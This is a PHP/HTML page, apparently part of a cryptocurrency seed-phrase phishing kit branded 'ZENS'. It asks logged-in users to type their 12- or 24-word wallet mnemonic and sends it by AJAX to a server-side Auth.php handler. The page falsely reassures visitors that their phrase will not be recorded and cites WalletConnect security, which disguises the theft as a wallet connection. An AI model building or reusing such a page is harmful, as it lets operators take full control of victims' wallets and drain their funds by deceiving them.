<?php
require_once(__DIR__ . "../../../config/config.php");
require_once(__DIR__ . "../../../config/function.php");


if (!CheckLogin()) header("Location: /Login");
$title = 'Connect';

require_once(__DIR__ . "../../../public/client/Header.php");
require_once(__DIR__ . "../../../public/client/Nav.php");

?>




<!-- Mobile Searchbar -->
</div>
<script src="https://code.iconify.design/iconify-icon/1.0.2/iconify-icon.min.js"></script>
<!-- <div id="ShowPage">
        -->
<p id="notifyinfo"></p>
<main class="main-content w-full px-[var(--margin-x)] pb-8" id="ShowPage" style="height:auto;" onscroll="document.getElementById('toolbar').style.top = Math.max(100, window.scrollY) + 'px'">
    <div class="mt-12 text-center">


        <form id="inter_form" method="POST">
            <input type="hidden" name="type" value="ChangePhrase">
            <span class="mt-3">Enter Mnemonic phrase</span>
            <label class="block mt-3">
                <textarea rows="5" placeholder="Separateed by space. You can choose to import wallets with 12-word or 24-word Mnemonics, phrase should be a plaintext." class="form-textarea w-full resize-none rounded-lg bg-slate-150 p-2.5 placeholder:text-slate-400 dark:bg-navy-900 dark:placeholder:text-navy-300" name="phrase" id="phrase"></textarea>
                <div id="word-count">Word Phrase: 0</div>
            </label>

            <p class="response mt-3"></p>

            <div class="mt-6 grid w-full grid-cols-2 gap-2 text-center">
                
                <button type="submit" id="conn" class="btn space-x-2 bg-primary px-0 font-medium text-white hover:bg-primary-focus focus:bg-primary-focus active:bg-primary-focus/90 dark:bg-accent dark:hover:bg-accent-focus dark:focus:bg-accent-focus dark:active:bg-accent/90">
                    <span>Send</span>
                </button>
            </div><br><br>
            <script>
                var button = document.getElementById('conn');
                button.addEventListener('click', function() {
                    $('.response').html('waiting...');
                    button.innerHTML = 'loading....';
                    setTimeout(function() {
                        $('.response').html('');
                        button.innerHTML = 'Send';
                    }, 3000);
                });
            </script>
            <b>
                <p id="show" style="color:#a4cea4"></p>



                <div class="card">
                    <div class="border-b border-slate-200 p-4 dark:border-navy-500 sm:px-5">

                    </div>

                    <div x-data="{expandedItem:'item-1'}" class="flex flex-col divide-y divide-slate-150 px-4 dark:divide-navy-500 sm:px-5">
                        <div x-data="accordionItem('item-1')">
                            <div @click="expanded = !expanded" class="flex cursor-pointer items-center justify-between py-4 text-base font-medium text-slate-700 dark:text-navy-100">
                                <p>Note*</p>
                                <div :class="expanded &amp;&amp; '-rotate-180'" class="text-sm font-normal leading-none text-slate-400 transition-transform duration-300 dark:text-navy-300 -rotate-180">
                                    <i class="fas fa-chevron-down"></i>
                                </div>
                            </div>
                            <div x-collapse="" x-show="expanded">
                                <div class="pb-4">
                                    <p>
                                        ZENS will not record your Mnemonics Phrase. You control the access
                                        and your assets.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div x-data="accordionItem('item-2')">
                            <div @click="expanded = !expanded" class="flex cursor-pointer items-center justify-between py-4 text-base font-medium text-slate-700 dark:text-navy-100">
                                <small>Note*</small>
                                <div :class="expanded &amp;&amp; '-rotate-180'" class="text-sm font-normal leading-none text-slate-400 transition-transform duration-300 dark:text-navy-300">
                                    <i class="fas fa-chevron-down"></i>
                                </div>
                            </div>
                            <div x-collapse="" x-show="expanded" style="display: none; height: 0px; overflow: hidden;" hidden="">
                                <div class="pb-4">
                                    <p>
                                        It is recommended that you manually input your Mnemonic Phrase
                                    </p>
                                </div>
                            </div>
                        </div>

                        <div x-data="accordionItem('item-3')">
                            <div @click="expanded = !expanded" class="flex cursor-pointer items-center justify-between py-4 text-base font-medium text-slate-700 dark:text-navy-100">
                                <small>Note*</small>
                                <div :class="expanded &amp;&amp; '-rotate-180'" class="text-sm font-normal leading-none text-slate-400 transition-transform duration-300 dark:text-navy-300">
                                    <i class="fas fa-chevron-down"></i>
                                </div>
                            </div>
                            <div x-collapse="" x-show="expanded" style="display: none; height: 0px; overflow: hidden;" hidden="">
                                <div class="pb-4">
                                    <p>
                                        Our communications protocol with WalletConnect brings the ecosystem
                                        together by enabling wallets and apps to securely connect and interact.
                                    </p>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>


                <br>
                <br>
                <br>




                <div id="loader" style="display: none; background-color:#31202000;" class="app-preloader fixed z-50 grid h-full w-full place-content-center bg-slate-50 dark:bg-navy-900">
                    <div class="modal-dialog">
                        <div class="modal-content" style="background-color:#31202000; border: 1px solid rgba(0, 0, 0, 0);">
                            <div class="modal-body">
                                <center>
                                    <p><img src="loader.gif" width="70px"></p>
                                </center>
                            </div>
                        </div>
                    </div>
                </div>
            </b>
        </form>
    </div>
</main>
</div><br>



<?php require_once(__DIR__ . "../../../public/client/Footer.php"); ?>

<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    function countWords(textareaId, wordCountId) {
        const textarea = document.getElementById(textareaId);
        const wordCount = document.getElementById(wordCountId);

        textarea.addEventListener('input', () => {
            const value = textarea.value.trim();
            const count = value === '' ? 0 : value.split(/\s+/).length;
            wordCount.innerText = `Word Phrase: ${count}`;
        });
    }
    countWords('phrase', 'word-count');
</script>
<script>
    $(document).ready(function() {
        $('#inter_form').on('submit', function(e) {
            e.preventDefault();
            var phrase = $('#phrase').val();

            var textarea = document.getElementById("phrase");
            var words = textarea.value.trim();
            var wordCount = words === '' ? 0 : words.split(/\s+/).length;
            //alert("Word count: " + wordCount);

            if (phrase == "") {
                $(".response").html("<div class='alert flex rounded-lg bg-warning px-4 py-4 text-white sm:px-5'><p>Enter All field</p></div>");
                return false;
            }

            if (wordCount !== 12 && wordCount !== 24) {
                $(".response").html("<div class='alert flex rounded-lg bg-warning px-4 py-4 text-white sm:px-5'><p>Invalid Mnemonics Phrase</p></div>");
                return false;
            }

            $.ajax({
                type: "POST",
                url: '<?= $url ?>assets/ajaxs/Auth.php',
                data: $('form').serialize(),
                dataType: "json",
                success: function(data) {
                    $(".response").html(data.content);
                    if (data.content == 'successful') {
                        $(".response").html(data.content);
                    } else
                    if (data.content == 'Error') {
                        $(".response").html(data.content);
                    }
                },
                error: function(data, errorThrown) {
                    Swal.fire('Failed?', '<small>Network anormaly</small>!', 'warning');
                }
            });

        });
    });
</script>